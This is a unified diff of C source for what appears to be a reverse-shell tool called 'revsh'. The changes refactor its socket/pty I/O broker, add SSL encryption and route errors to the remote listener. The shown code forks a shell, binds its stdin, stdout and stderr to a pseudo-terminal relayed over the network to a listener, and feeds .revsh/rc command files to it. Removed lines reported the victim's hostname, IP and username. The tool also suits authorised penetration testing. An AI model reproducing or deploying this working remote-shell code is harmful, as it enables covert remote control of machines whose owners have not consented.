-		if((retval = grantpt(pty_master)) == -1){
-			error(-1, errno, "grantpt(%d)", pty_master);
-		}
-
-		if((retval = unlockpt(pty_master)) == -1){
-			error(-1, errno, "unlockpt(%d)", pty_master);
-		}
-
-		if((retval = ioctl(pty_master, TIOCSWINSZ, &tty_winsize)) == -1){
-			error(-1, errno, "ioctl(%d, %d, %lx)", \
-					pty_master, TIOCGWINSZ, (unsigned long) &tty_winsize);
-		}
-
-		if((pty_name = ptsname(pty_master)) == NULL){
-			error(-1, errno, "ptsname(%d)", pty_master);
-		}
-
-		if((pty_slave = open(pty_name, O_RDWR|O_NOCTTY)) == -1){
-			error(-1, errno, "open(%s, O_RDWR|O_NOCTTY)", pty_name);
-		}
-
-		// - Send basic information back to the listener about the connecting host.
-		//   (e.g. hostname, ip address, username)
-		memset(buff_head, 0, buff_len);
-		if((retval = gethostname(buff_head, buff_len - 1)) == -1){
-			error(-1, errno, "gethostname(%lx, %d)", \
-					(unsigned long) buff_head, buff_len - 1);
-		}
-
-		printf("################################\r\n");
-		printf("# hostname: %s\r\n", buff_head);
-
-		memset(buff_head, 0, buff_len);
-		memset(&sa, 0, sizeof(sa));
-		sa_len = sizeof(sa);
-		if((retval = getsockname(sock_fd, &sa, &sa_len)) == -1){
-			error(-1, errno, "getsockname(%d, %lx, %lx)", \
-					sock_fd, (unsigned long) &sa, (unsigned long) &sa_len);
-		}
-
-		memset(buff_head, 0, buff_len);
-		switch(rp->ai_family){
-			case AF_INET:
-				if(inet_ntop(rp->ai_family, &(((struct sockaddr_in *) &sa)->sin_addr), \
-							buff_head, buff_len - 1) == NULL){
-					error(-1, errno, "inet_ntop(%d, %lx, %lx, %d)", \
-							rp->ai_family, (unsigned long) &(sa.sa_data), \
-							(unsigned long) buff_head, buff_len - 1);
-				}
-				break;
-
-			case AF_INET6:
-				if(inet_ntop(rp->ai_family, &(((struct sockaddr_in6 *) &sa)->sin6_addr), \
-							buff_head, buff_len - 1) == NULL){
-					error(-1, errno, "inet_ntop(%d, %lx, %lx, %d)", \
-							rp->ai_family, (unsigned long) &(sa.sa_data), \
-							(unsigned long) buff_head, buff_len - 1);
-				}
-				break;
-
-			default:
-				error(-1, 0, "unknown ai_family: %d\r\n", rp->ai_family);
-		}
-		freeaddrinfo(result);
-
-		printf("# ip address: %s\r\n", buff_head);
-		printf("# username: %s\r\n", getenv("LOGNAME"));
-		printf("################################\r\n");
-		fflush(stdout);
 
 		// - Fork a child to run the shell.
 		retval = fork();
 
 		if(retval == -1){
-			error(-1, errno, "fork()");
+			io.remote_printf(&io, "%s: %d: fork(): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					strerror(errno));
+			exit(-1);
 		}
 
 		if(retval){
 
-			// - Parent: Enter the io_loop() and broker data.
+			// - Parent: Enter the broker() and broker data.
 			if((retval = close(pty_slave)) == -1){
-				error(-1, errno, "close(%d)", pty_slave);
+				io.remote_printf(&io, "%s: %d: close(%d): %s\r\n", \
+						program_invocation_short_name, io.listener, \
+						pty_slave, strerror(errno));
+				exit(-1);
 			}
 
-			retval = io_loop(pty_master, sock_fd, listener);
+			io.local_fd = pty_master;
 
-#ifdef debug
+			retval = broker(&io);
+
 			if((retval == -1)){
-				error(-1, errno, "io_loop(%d, %d, %d)", pty_master, sock_fd, listener);
+				io.remote_printf(&io, "%s: %d: broker(%lx): %s\r\n", \
+						program_invocation_short_name, io.listener, \
+						(unsigned long) &io, strerror(errno));
+				exit(-1);
 			}
-#endif
+
+			if(io.encryption){
+				SSL_shutdown(io.ssl);
+				SSL_free(io.ssl);
+				SSL_CTX_free(io.ctx);
+			}
 
 			return(0);
 		}
 
 		// - Child: Initialize file descriptors.
 		if((retval = close(pty_master)) == -1){
-			error(-1, errno, "close(%d)", pty_master);
+			io.remote_printf(&io, "%s: %d: close(%d): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					pty_master, strerror(errno));
+			exit(-1);
 		}
-
-		if((retval = close(sock_fd)) == -1){
-			error(-1, errno, "close(%d)", pty_master);
-		}
-
 		if((retval = dup2(pty_slave, STDIN_FILENO)) == -1){
-			error(-1, errno, "dup2(%d, STDIN_FILENO)", pty_slave);
+			io.remote_printf(&io, "%s: %d: dup2(%d, STDIN_FILENO): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					pty_slave, strerror(errno));
+			exit(-1);
 		}
 
 		if((retval = dup2(pty_slave, STDOUT_FILENO)) == -1){
-			error(-1, errno, "dup2(%d, STDOUT_FILENO)", pty_slave);
-		}
-
-		if((retval = close(STDERR_FILENO)) == -1){
-			error(-1, errno, "close(%d)", pty_master);
+			io.remote_printf(&io, "%s: %d: dup2(%d, STDOUT_FILENO): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					pty_slave, strerror(errno));
+			exit(-1);
 		}
 
 		if((retval = dup2(pty_slave, STDERR_FILENO)) == -1){
-			exit(-2);
+			io.remote_printf(&io, "%s: %d: dup2(%d, %d): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					pty_slave, STDERR_FILENO, strerror(errno));
+			exit(-1);
+		}
+
+		if((retval = close(io.remote_fd)) == -1){
+			io.remote_printf(&io, "%s: %d: close(%d): %s\r\n", \
+					program_invocation_short_name, io.listener, \
+					io.remote_fd, strerror(errno));
+			exit(-1);
 		}
 
 		if((retval = close(pty_slave)) == -1){
@@ -769,178 +908,7 @@ int main(int argc, char **argv){
 
 /*******************************************************************************
  *
- * usage()
- *
- * Input: None.
- * Output: None.
- *
- * Purpose: Educate the user as to the error of their ways.
- *
- ******************************************************************************/
-void usage(){
-	fprintf(stderr, "\nusage: %s [-l [-e ENV_ARGS] [-s SHELL]] ADDRESS PORT\n", \
-			program_invocation_short_name);
-	fprintf(stderr, "\n\t-l: Setup a listener.\n");
-	fprintf(stderr, "\t-e ENV_ARGS: Export ENV_ARGS to the remote shell. (Defaults are \"TERM\" and \"LANG\".)\n");
-	fprintf(stderr, "\t-s SHELL: Invoke SHELL as the remote shell. (Default is /bin/bash.)\n");
-	fprintf(stderr, "\n\tNote: '-e' and '-s' only work with a listener.\n\n");
-
-	exit(-1);
-}
-
-
-/*******************************************************************************
- * 
- * signal_handler()
- *
- * Input: The signal being handled.
- * Output: None. 
- * 
- * Purpose: To handle signals! For best effort at avoiding race conditions,
- *  we simply mark that the signal was found and return. This allows the
- *  io_loop() select() call to manage signal generating events.
- * 
- ******************************************************************************/
-void signal_handler(int signal){
-	sig_found = signal;
-}
-
-
-/*******************************************************************************
- *
- * string_to_vector()
- *
- * Input: A string of tokens, whitespace delimited, null terminated.
- * Output: An array of strings containing the tokens. The array itself is 
- *  also null terminated. NULL will be returned on error.
- *
- * Purpose: Tokenize a string for later consumption. 
- *  (In this case, we are performing serialization of data for use with
- *  in-band signalling by converting the data into a whitespace delimited
- *  string for transmission.)
- *
- ******************************************************************************/
-char **string_to_vector(char *command_string){
-
-	int was_space = 1;
-	int count = 0;
-	int i, len;
-
-	char *index;
-	char *token_start = NULL;
-
-	char **argv;
-
-	index = command_string;
-	while(*index){
-
-		// Lets step through the string and look for tokens. We aren't grabbing them
-		// yet, just counting them.
-		// Note, we are looking at the transition boundaries from space->!space and
-		// !space->space to define the token. "count" will denote these transitions.
-		// An odd count implies that we are in a token. An even count implies we are
-		// between tokens.
-		if(isspace(*index)){
-			if(!was_space){
-				// end of a token.
-				count++;
-			}
-			was_space = 1;
-		}else{
-			if(was_space){
-				// start of a token.
-				count++;
-			}
-			was_space = 0;
-		}
-		index++;
-	}
-
-	// Don't forget to account for the case where the last token is up against the
-	// '\0' terminator with no space between.
-	if(count % 2){
-		count++;
-	}
-
-	// Now, (count / 2) will be the number of tokens.
-	// Since we know the number of tokens, lets setup argv.
-	if((argv = (char **) malloc((sizeof(char *) * ((count / 2) + 1)))) == NULL){
-#ifdef DEBUG
-		fprintf(stderr, "%s: string_to_vector(): malloc(%d): %s\r\n", \
-				program_invocation_short_name, \
-				(int) ((sizeof(char *) * ((count / 2) + 1))), strerror(errno));
-#endif
-		return(NULL);
-	}
-	memset(argv, 0, (sizeof(char *) * ((count / 2) + 1)));
-
-	// Now, let's do that loop again, this time saving the tokens.
-	i = 0;
-	len = 0;
-	count = 0;
-	was_space = 1;
-	index = command_string;
-	while(*index){
-		if(isspace(*index)){
-			if(!was_space){
-				// end of a token.
-				if((argv[i] = (char *) malloc(sizeof(char) * (len + 1))) == NULL){
-#ifdef DEBUG
-					fprintf(stderr, "%s: string_to_vector(): malloc(%d): %s\r\n", \
-							program_invocation_short_name, \
-							(int) (sizeof(char) * (len + 1)), strerror(errno));
-#endif
-					goto CLEAN_UP;
-				}
-				memset(argv[i], 0, sizeof(char) * (len + 1));
-				memcpy(argv[i], token_start, sizeof(char) * len);
-				i++;
-				len = 0;
-				count++;
-			}
-			was_space = 1;
-		}else{
-			if(was_space){
-				// start of a token.
-				count++;
-				token_start = index;
-			}
-			len++;
-			was_space = 0;
-		}
-		index++;
-	}
-
-	// Same final token termination case.
-	if(count % 2){
-		if((argv[i] = malloc(sizeof(char) * (len + 1))) == NULL){
-#ifdef DEBUG
-			fprintf(stderr, "%s: string_to_vector(): malloc(%d): %s\r\n", \
-					program_invocation_short_name, \
-					(int) (sizeof(char) * (len + 1)), strerror(errno));
-#endif
-			goto CLEAN_UP;
-		}
-		memset(argv[i], 0, sizeof(char) * (len + 1));
-		memcpy(argv[i], token_start, sizeof(char) * len);
-	}
-
-	return(argv);
-
-CLEAN_UP:
-	i = 0;
-	while(argv[i]){
-		free(argv[i]);
-	}
-
-	free(argv);
-	return(NULL);
-}
-
-
-/*******************************************************************************
- *
- * io_loop()
+ * broker()
  *
  * Input: Two file descriptors. Also, an indication of whether or not we are a
  *  listener.
@@ -950,7 +918,7 @@ CLEAN_UP:
  *  signal events (e.g. SIGWINCH) with in-band signalling.
  *
  ******************************************************************************/
-int io_loop(int local_fd, int remote_fd, int listener){
+int broker(struct remote_io_helper *io){
 
 	int retval = -1;
 	fd_set fd_select;
@@ -966,8 +934,8 @@ int io_loop(int local_fd, int remote_fd, int listener){
 	// the end.
 	// 
 	// EDIT: Added UTF8_HIGH to the APC and ST characters to ensure the in-band signalling can coexist with utf8 data.
-	//	We don't bother with the UTF8_HIGH parts before the io_loop() because they don't intermingle with user 
-	//	generated data at that point.
+	//	We don't bother with the UTF8_HIGH parts before the broker() because they don't intermingle with user 
+	//	generated data until now.
 	char *event_ptr = NULL;
 
 	struct sigaction act;
@@ -987,17 +955,19 @@ int io_loop(int local_fd, int remote_fd, int listener){
 	char *rc_file_head, *rc_file_tail;
 	int rc_file_fd;
 
+	int fcntl_flags;
 
-	if(listener){
+	int ssl_bytes_pending = 0;
+
+
+	if(io->listener){
 		memset(&act, 0, sizeof(act));
 		act.sa_handler = signal_handler;
 
 		if((retval = sigaction(SIGWINCH, &act, NULL)) == -1){
-#ifdef DEBUG
 			fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
-					program_invocation_short_name, listener, \
+					program_invocation_short_name, io->listener, \
 					SIGWINCH, (unsigned long) &act, NULL, strerror(errno));
-#endif
 			goto CLEAN_UP;
 		}
 	}
@@ -1016,11 +986,11 @@ int io_loop(int local_fd, int remote_fd, int listener){
 
 
 	// Let's add support for .revsh/rc files here! :D
-	if(listener){
-		
+	if(io->listener){
+
 		if((rc_file_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
 			fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
-					program_invocation_short_name, listener, PATH_MAX, (int) sizeof(char), \
+					program_invocation_short_name, io->listener, PATH_MAX, (int) sizeof(char), \
 					strerror(errno));
 			retval = -1;
 			goto CLEAN_UP;
@@ -1040,41 +1010,30 @@ int io_loop(int local_fd, int remote_fd, int listener){
 
 			while((io_bytes = read(rc_file_fd, buff_head, buff_len))){
 				if(io_bytes == -1){
-#ifdef DEBUG
-					fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): %s\r\n", \
-							program_invocation_short_name, listener, \
+					fprintf(stderr, "%s: %d: broker(): read(%d, %lx, %d): %s\r\n", \
+							program_invocation_short_name, io->listener, \
 							rc_file_fd, (unsigned long) buff_head, buff_len, strerror(errno));
-#endif
 					retval = -1;
 					goto CLEAN_UP;
 				}
 
 				if(!io_bytes){
-#ifdef DEBUG
-					fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): A OK!\r\n", \
-							program_invocation_short_name, listener, \
-							rc_file_fd, (unsigned long) buff_head, buff_len);
-#endif
 					retval = 0;
 					goto CLEAN_UP;
 				}
 
-				if((retval = write(remote_fd, buff_head, io_bytes)) == -1){
-#ifdef DEBUG
-					fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
-							program_invocation_short_name, listener, \
-							remote_fd, (unsigned long) buff_head, io_bytes, strerror(errno));
-#endif
+				if((retval = io->remote_write(io, buff_head, io_bytes)) == -1){
+					fprintf(stderr, "%s: %d: broker(): io->remote_write(%lx, %lx, %d): %s\r\n", \
+							program_invocation_short_name, io->listener, \
+							(unsigned long) io, (unsigned long) buff_head, io_bytes, strerror(errno));
 					goto CLEAN_UP;
 				}
 
 				if(retval != io_bytes){
-#ifdef DEBUG
 					fprintf(stderr, \
-							"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
-							program_invocation_short_name, listener, \
-							remote_fd, (unsigned long) buff_head, io_bytes, retval, io_bytes);
-#endif
+							"%s: %d: broker(): io->remote_write(%lx, %lx, %d): %d bytes of %d written\r\n", \
+							program_invocation_short_name, io->listener, \
+							(unsigned long) io, (unsigned long) buff_head, io_bytes, retval, io_bytes);
 					retval = -1;
 					goto CLEAN_UP;
 				}
@@ -1088,23 +1047,42 @@ int io_loop(int local_fd, int remote_fd, int listener){
 	}
 
 
+	if((fcntl_flags = fcntl(io->remote_fd, F_GETFL, 0)) == -1){
+		// XXX		error(-1, errno, "fcntl(%d, FGETFL, 0)", remote_fd);
+		retval = -1;
+		goto CLEAN_UP;
+	}
+
+	fcntl_flags |= O_NONBLOCK;
+	if((retval = fcntl(io->remote_fd, F_SETFL, fcntl_flags)) == -1){
+		// XXX		error(-1, errno, "fcntl(%d, FSETFL, %d)", remote_fd, fcntl_flags);
+		retval = -1;
+		goto CLEAN_UP;
+	}
+
+
 	// select() loop for multiplexed blocking io.
 	while(1){
-		FD_ZERO(&fd_select);
-		FD_SET(local_fd, &fd_select);
-		FD_SET(remote_fd, &fd_select);
 
-		fd_max = (local_fd > remote_fd) ? local_fd : remote_fd;
+		if(io->encryption){
+			ssl_bytes_pending = SSL_pending(io->ssl);
+		}
 
-		if(((retval = select(fd_max + 1, &fd_select, NULL, NULL, NULL)) == -1) \
-				&& !sig_found){
-#ifdef DEBUG
-			fprintf(stderr, \
-					"%s: %d: io_loop(): select(%d, %lx, NULL, NULL, NULL): %s\r\n", \
-					program_invocation_short_name, listener, remote_fd + 1, \
-					(unsigned long) &fd_select, strerror(errno));
-#endif
-			goto CLEAN_UP;
+		if(!ssl_bytes_pending){
+			FD_ZERO(&fd_select);
+			FD_SET(io->local_fd, &fd_select);
+			FD_SET(io->remote_fd, &fd_select);
+
+			fd_max = (io->local_fd > io->remote_fd) ? io->local_fd : io->remote_fd;
+
+			if(((retval = select(fd_max + 1, &fd_select, NULL, NULL, NULL)) == -1) \
+					&& !sig_found){
+				fprintf(stderr, \
+						"%s: %d: broker(): select(%d, %lx, NULL, NULL, NULL): %s\r\n", \
+						program_invocation_short_name, io->listener, fd_max + 1, \
+						(unsigned long) &fd_select, strerror(errno));
+				goto CLEAN_UP;
+			}
 		}
 
 		// Case 1: select() was interrupted by a signal that we handle.
@@ -1118,12 +1096,10 @@ int io_loop(int local_fd, int remote_fd, int listener){
 			switch(current_sig){
 
 				case SIGWINCH:
-					if((retval = ioctl(local_fd, TIOCGWINSZ, &tty_winsize)) == -1){
-#ifdef DEBUG
+					if((retval = ioctl(io->local_fd, TIOCGWINSZ, &tty_winsize)) == -1){
 						fprintf(stderr, "%s: %d: ioctl(%d, TIOCGWINSZ, %lx): %s\r\n", \
-								program_invocation_short_name, listener, \
-								local_fd, (unsigned long) &tty_winsize, strerror(errno));
-#endif
+								program_invocation_short_name, io->listener, \
+								io->local_fd, (unsigned long) &tty_winsize, strerror(errno));
 						goto CLEAN_UP;
 					}
 
@@ -1131,44 +1107,35 @@ int io_loop(int local_fd, int remote_fd, int listener){
 					if((io_bytes = snprintf(winsize_buff_head, winsize_buff_len - 1, \
 									"%c%c%hd %hd%c%c", (char) UTF8_HIGH, (char) APC, tty_winsize.ws_row, \
 									tty_winsize.ws_col, (char) UTF8_HIGH, (char) ST)) < 0){
-#ifdef DEBUG
 						fprintf(stderr, \
 								"%s: %d: snprintf(winsize_buff_head, winsize_buff_len, \"%%c%%hd %%hd%%c\", APC, %hd, %hd, ST): %s\r\n", \
-								program_invocation_short_name, listener, \
+								program_invocation_short_name, io->listener, \
 								tty_winsize.ws_row, tty_winsize.ws_col, strerror(errno));
-#endif
 						retval = -1;
 						goto CLEAN_UP;
 					}
 
-					if((retval = write(remote_fd, winsize_buff_head, io_bytes)) == -1){
-#ifdef DEBUG
-						fprintf(stderr, "%s: %d: write(%d, %lx, %d): %s\r\n", \
-								program_invocation_short_name, listener, \
-								remote_fd, (unsigned long) winsize_buff_head, io_bytes, \
+					if((retval = io->remote_write(io, winsize_buff_head, io_bytes)) == -1){
+						fprintf(stderr, "%s: %d: io->remote_write(%lx, %lx, %d): %s\r\n", \
+								program_invocation_short_name, io->listener, \
+								(unsigned long) io, (unsigned long) winsize_buff_head, io_bytes, \
 								strerror(errno));
-#endif
 						goto CLEAN_UP;
 					}
 
 					if(retval != io_bytes){
-#ifdef DEBUG
 						fprintf(stderr, \
-								"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
-								program_invocation_short_name, listener, remote_fd, \
+								"%s: %d: broker(): io->remote_write(%lx, %lx, %d): %d bytes of %d written\r\n", \
+								program_invocation_short_name, io->listener, (unsigned long) io, \
 								(unsigned long) winsize_buff_head, io_bytes, retval, io_bytes);
-#endif
 						retval = -1;
 						goto CLEAN_UP;
 					}
 					break;
 
 				default:
-
-#ifdef DEBUG
-					fprintf(stderr, "%s: %d: io_loop(): Undefined signal found: %d\r\n", \
-							program_invocation_short_name, listener, current_sig);
-#endif
+					fprintf(stderr, "%s: %d: broker(): Undefined signal found: %d\r\n", \
+							program_invocation_short_name, io->listener, current_sig);
 					retval = -1;
 					goto CLEAN_UP;
 			}
@@ -1177,71 +1144,57 @@ int io_loop(int local_fd, int remote_fd, int listener){
 
 
 			// Case 2: Data is ready on the local fd.
-		}else if(FD_ISSET(local_fd, &fd_select)){
+		}else if(FD_ISSET(io->local_fd, &fd_select)){
 
 			memset(buff_head, 0, buff_len);
 
-			if((io_bytes = read(local_fd, buff_head, buff_len)) == -1){
-#ifdef DEBUG
-				fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): %s\r\n", \
-						program_invocation_short_name, listener, \
-						local_fd, (unsigned long) buff_head, buff_len, strerror(errno));
-#endif
+			if((io_bytes = read(io->local_fd, buff_head, buff_len)) == -1){
+				if(!io->listener && errno == EIO){
+					goto CLEAN_UP;
+				}
+				io->remote_printf(io, "%s: %d: broker(): read(%d, %lx, %d): %s\r\n", \
+						program_invocation_short_name, io->listener, \
+						io->local_fd, (unsigned long) buff_head, buff_len, strerror(errno));
 				retval = -1;
 				goto CLEAN_UP;
 			}
 
 			if(!io_bytes){
-#ifdef DEBUG
-				fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): A OK!\r\n", \
-						program_invocation_short_name, listener, \
-						local_fd, (unsigned long) buff_head, buff_len);
-#endif
 				retval = 0;
 				goto CLEAN_UP;
 			}
 
-			if((retval = write(remote_fd, buff_head, io_bytes)) == -1){
-#ifdef DEBUG
-				fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
-						program_invocation_short_name, listener, \
-						remote_fd, (unsigned long) buff_head, io_bytes, strerror(errno));
-#endif
+			if((retval = io->remote_write(io, buff_head, io_bytes)) == -1){
+				io->remote_printf(io, "%s: %d: broker(): io->remote_write(%lx, %lx, %d): %s\r\n", \
+						program_invocation_short_name, io->listener, \
+						(unsigned long) io, (unsigned long) buff_head, io_bytes, strerror(errno));
 				goto CLEAN_UP;
 			}
 
 			if(retval != io_bytes){
-#ifdef DEBUG
-				fprintf(stderr, \
-						"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
-						program_invocation_short_name, listener, \
-						remote_fd, (unsigned long) buff_head, io_bytes, retval, io_bytes);
-#endif
+				io->remote_printf(io, \
+						"%s: %d: broker(): io->remote_write(%lx, %lx, %d): %d bytes of %d written\r\n", \
+						program_invocation_short_name, io->listener, \
+						(unsigned long) io, (unsigned long) buff_head, io_bytes, retval, io_bytes);
 				retval = -1;
 				goto CLEAN_UP;
 			}
 
 			// Case 3: Data is ready on the remote fd.
-		}else if(FD_ISSET(remote_fd, &fd_select)){
+		}else if(FD_ISSET(io->remote_fd, &fd_select) || ssl_bytes_pending){
 
+			ssl_bytes_pending = 0;
 			memset(buff_head, 0, buff_len);
 
-			if((io_bytes = read(remote_fd, buff_head, buff_len)) == -1){
-#ifdef DEBUG
-				fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): %s\r\n", \
-						program_invocation_short_name, listener, \
-						remote_fd, (unsigned long) buff_head, buff_len, strerror(errno));
-#endif
+			if((io_bytes = io->remote_read(io, buff_head, buff_len)) == -1){
+				io->remote_printf(io, "%s: %d: broker(): io->remote_read(%lx, %lx, %d): %s\r\n", \
+						program_invocation_short_name, io->listener, \
+						(unsigned long) io, (unsigned long) buff_head, buff_len, strerror(errno));
 				retval = -1;
 				goto CLEAN_UP;
 			}
 
 			if(!io_bytes){
-#ifdef DEBUG
-				fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): A OK!\r\n", \
-						program_invocation_short_name, listener, \
-						remote_fd, (unsigned long) buff_head, buff_len);
-#endif
 				retval = 0;
 				goto CLEAN_UP;
 			}
@@ -1249,27 +1202,23 @@ int io_loop(int local_fd, int remote_fd, int listener){
 			buff_tail = buff_head + io_bytes;
 
 
-			if(!listener && (event_ptr = strchr(buff_head, (char) UTF8_HIGH))){
+			if(!io->listener && (event_ptr = strchr(buff_head, (char) UTF8_HIGH))){
 
 				// First, clear out any data not part of the in-band signalling
 				// that may be at the front of our buffer.
 				tmp_len = event_ptr - buff_head;
-				if((retval = write(local_fd, buff_head, tmp_len)) == -1){
-#ifdef DEBUG
-					fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
-							program_invocation_short_name, listener, \
-							local_fd, (unsigned long) buff_head, tmp_len, strerror(errno));
-#endif
+				if((retval = write(io->local_fd, buff_head, tmp_len)) == -1){
+					io->remote_printf(io, "%s: %d: broker(): write(%d, %lx, %d): %s\r\n", \
+							program_invocation_short_name, io->listener, \
+							io->local_fd, (unsigned long) buff_head, tmp_len, strerror(errno));
 					goto CLEAN_UP;
 				}
 
 				if(retval != tmp_len){
-#ifdef DEBUG
-					fprintf(stderr, \
-							"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
-							program_invocation_short_name, listener, \
-							local_fd, (unsigned long) buff_head, tmp_len, retval, io_bytes);
-#endif
+					io->remote_printf(io, \
+							"%s: %d: broker(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
+							program_invocation_short_name, io->listener, \
+							io->local_fd, (unsigned long) buff_head, tmp_len, retval, io_bytes);
 					retval = -1;
 					goto CLEAN_UP;
 				}
@@ -1294,12 +1243,10 @@ int io_loop(int local_fd, int remote_fd, int listener){
 					}else{
 
 						// read() a char
-						if((tmp_len = read(remote_fd, &tmp_char, 1)) == -1){
-#ifdef DEBUG
-							fprintf(stderr, "%s: %d: read(%d, %lx, %d): %s\r\n", \
-									program_invocation_short_name, listener, \
-									remote_fd, (unsigned long) &tmp_char, 1, strerror(errno));
-#endif
+						if((tmp_len = io->remote_read(io, &tmp_char, 1)) == -1){
+							io->remote_printf(io, "%s: %d: io->remote_read(%lx, %lx, %d): %s\r\n", \
+									program_invocation_short_name, io->listener, \
+									(unsigned long) io, (unsigned long) &tmp_char, 1, strerror(errno));
 							retval = -1;
 							goto CLEAN_UP;
 						}
@@ -1316,22 +1263,18 @@ int io_loop(int local_fd, int remote_fd, int listener){
 								state_counter = APC_HIGH_FOUND;
 							}else{
 
-								if((retval = write(local_fd, &tmp_char, 1)) == -1){
-#ifdef DEBUG
-									fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
-											program_invocation_short_name, listener, \
-											local_fd, (unsigned long) &tmp_char, 1, strerror(errno));
-#endif
+								if((retval = write(io->local_fd, &tmp_char, 1)) == -1){
+									io->remote_printf(io, "%s: %d: broker(): write(%d, %lx, %d): %s\r\n", \
+											program_invocation_short_name, io->listener, \
+											io->local_fd, (unsigned long) &tmp_char, 1, strerror(errno));
 									goto CLEAN_UP;
 								}
 
 								if(retval != 1){
-#ifdef DEBUG
-									fprintf(stderr, \
-											"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
-											program_invocation_short_name, listener, \
-											local_fd, (unsigned long) &tmp_char, 1, retval, 1);
-#endif
+									io->remote_printf(io, \
+											"%s: %d: broker(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
+											program_invocation_short_name, io->listener, \
+											io->local_fd, (unsigned long) &tmp_char, 1, retval, 1);
 									retval = -1;
 									goto CLEAN_UP;
 								}
@@ -1350,42 +1293,34 @@ int io_loop(int local_fd, int remote_fd, int listener){
 								state_counter = NO_EVENT;
 
 								// remember that UTF8_HIGH we stored at buff_head[0] earlier?  Yeah. :)
-								if((retval = write(local_fd, buff_head, 1)) == -1){
-#ifdef DEBUG
-									fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
-											program_invocation_short_name, listener, \
-											local_fd, (unsigned long) UTF8_HIGH, 1, strerror(errno));
-#endif
+								if((retval = write(io->local_fd, buff_head, 1)) == -1){
+									io->remote_printf(io, "%s: %d: broker(): write(%d, %lx, %d): %s\r\n", \
+											program_invocation_short_name, io->listener, \
+											io->local_fd, (unsigned long) UTF8_HIGH, 1, strerror(errno));
 									goto CLEAN_UP;
 								}
 
 								if(retval != 1){
-#ifdef DEBUG
-									fprintf(stderr, \
-											"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
-											program_invocation_short_name, listener, \
-											local_fd, (unsigned long) UTF8_HIGH, 1, retval, 1);
-#endif
+									io->remote_printf(io, \
+											"%s: %d: broker(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
+											program_invocation_short_name, io->listener, \
+											io->local_fd, (unsigned long) UTF8_HIGH, 1, retval, 1);
 									retval = -1;
 									goto CLEAN_UP;
 								}
 
-								if((retval = write(local_fd, &tmp_char, 1)) == -1){
-#ifdef DEBUG
-									fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
-											program_invocation_short_name, listener, \
-											local_fd, (unsigned long) &tmp_char, 1, strerror(errno));
-#endif
+								if((retval = write(io->local_fd, &tmp_char, 1)) == -1){
+									io->remote_printf(io, "%s: %d: broker(): write(%d, %lx, %d): %s\r\n", \
+											program_invocation_short_name, io->listener, \
+											io->local_fd, (unsigned long) &tmp_char, 1, strerror(errno));
 									goto CLEAN_UP;
 								}
 
 								if(retval != 1){
-#ifdef DEBUG
-									fprintf(stderr, \
-											"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
-											program_invocation_short_name, listener, \
-											local_fd, (unsigned long) &tmp_char, 1, retval, 1);
-#endif
+									io->remote_printf(io, \
+											"%s: %d: broker(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
+											program_invocation_short_name, io->listener, \
+											io->local_fd, (unsigned long) &tmp_char, 1, retval, 1);
 									retval = -1;
 									goto CLEAN_UP;
 								}
@@ -1402,9 +1337,9 @@ int io_loop(int local_fd, int remote_fd, int listener){
 
 								if((winsize_buff_tail - winsize_buff_head) > winsize_buff_len){
 
-									fprintf(stderr, \
-											"%s: %d: io_loop(): switch(%d): winsize_buff overflow.\r\n", \
-											program_invocation_short_name, listener, state_counter);
+									io->remote_printf(io, \
+											"%s: %d: broker(): switch(%d): winsize_buff overflow.\r\n", \
+											program_invocation_short_name, io->listener, state_counter);
 									retval = -1;
 									goto CLEAN_UP;
 								}
@@ -1420,21 +1355,17 @@ int io_loop(int local_fd, int remote_fd, int listener){
 								// Should have the winsize data by this point, so consume it and 
 								// signal the foreground process group.
 								if((winsize_vec = string_to_vector(winsize_buff_head)) == NULL){
-#ifdef DEBUG
-									fprintf(stderr, "%s: %d: io_loop(): string_to_vector(%s): %s\r\n", \
-											program_invocation_short_name, listener, \
+									io->remote_printf(io, "%s: %d: broker(): string_to_vector(%s): %s\r\n", \
+											program_invocation_short_name, io->listener, \
 											winsize_buff_head, strerror(errno));
-#endif
 									retval = -1;
 									goto CLEAN_UP;
 								}
 
 								if(winsize_vec[0] == NULL){
-#ifdef DEBUG
-									fprintf(stderr, \
+									io->remote_printf(io, \
 											"%s: %d: invalid initialization: tty_winsize.ws_row\r\n", \
-											program_invocation_short_name, listener);
-#endif
+											program_invocation_short_name, io->listener);
 									retval = -1;
 									goto CLEAN_UP;
 								}
@@ -1442,21 +1373,17 @@ int io_loop(int local_fd, int remote_fd, int listener){
 								errno = 0;
 								tty_winsize.ws_row = (short) strtol(winsize_vec[0], NULL, 10);
 								if(errno){
-#ifdef DEBUG
-									fprintf(stderr, "%s: %d: strtol(%s): %s\r\n", \
